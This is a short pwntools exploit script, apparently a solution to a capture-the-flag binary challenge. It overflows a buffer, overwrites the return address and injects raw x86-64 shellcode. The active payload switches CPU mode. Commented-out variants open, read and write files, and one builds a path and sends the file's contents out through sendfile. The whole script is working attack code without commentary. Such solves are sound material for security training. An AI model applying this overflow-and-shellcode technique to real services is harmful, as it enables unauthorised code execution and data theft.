from pwn import *
elf = context.binary= ELF('./challenge')
context.arch = 'amd64'
#p = process()
#p = remote('34.126.117.161',3000)
script = """
b*main+147
c
"""
p = gdb.debug('./challenge',script)
payload = cyclic(56) + p64(0x00000000004012fa) + cyclic(0x141-64) + b'\x48\xC7\xC3\x23\x00\x00\x00\x48\x31\xC0\x48\x31\xD8\x50\x54\xCB'
#payload += b'\x48\xC7\xC0\x02\x00\x00\x40\x48\xC7\xC7\x00\x40\x40\x00\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\xC7\xC0\x00\x00\x00\x40\x48\xC7\xC6\x00\x40\x40\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x40\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC6\x00\x40\x40\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05'





#payload = cyclic(0x141)
#payload += b'\x48\x31\xFF\x48\xC7\xC7\x80\x10\x40\x00\x48\x31\xDB\x48\x89\xFB\xFF\xD3'
#payload += b'\x48\x31\xFF\x48\xFF\xC7\x54\x5E\x48\x31\xD2\x48\xFF\xC2\x48\xFF\xC2\x48\xFF\xC2\x48\xFF\xC2\x48\xFF\xC2\x48\xFF\xC2\x48\x31\xC0\xFE\xC0\x0F\x05'
#payload += b'\x48\x31\xFF\x48\xFF\xC7\x54\x5E\x48\x31\xD2\x48\xFF\xC2\x48\xFF\xC2\x48\xFF\xC2\x48\xFF\xC2\x48\xFF\xC2\x48\xFF\xC2\x48\x31\xC0\xFE\xC0\x0F\x05\x48\x31\xDB\x48\xC7\xC3\x97\x13\x40\x00\xFF\xE3'
#payload += b'\x48\x31\xC0\x48\x31\xFF\xB0\x3C\x0F\x05'
#payload += b'\x48\x31\xDB\x48\xBB\x69\x6C\x65\x5F\x6E\x61\x6D\x65\x6A\x00\x53\x48\x31\xDB\x48\xBB\x65\x2F\x66\x61\x6B\x65\x5F\x66\x53\x48\x31\xDB\x48\xBB\x77\x61\x72\x65\x68\x6F\x75\x73\x53\x48\x31\xDB\x48\xBB\x2E\x2F\x2F\x2F\x2F\x2F\x2F\x2F\x53\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\x31\xC0\xB0\x02\x0F\x05\x48\x31\xFF\x48\x83\xC7\x01\x89\xC6\x48\x31\xD2\x4D\x31\xD2\x49\xC7\xC2\x00\x10\x00\x00\x48\x31\xC0\xB0\x28\x0F\x05'
p.sendline(payload)
p.interactive()
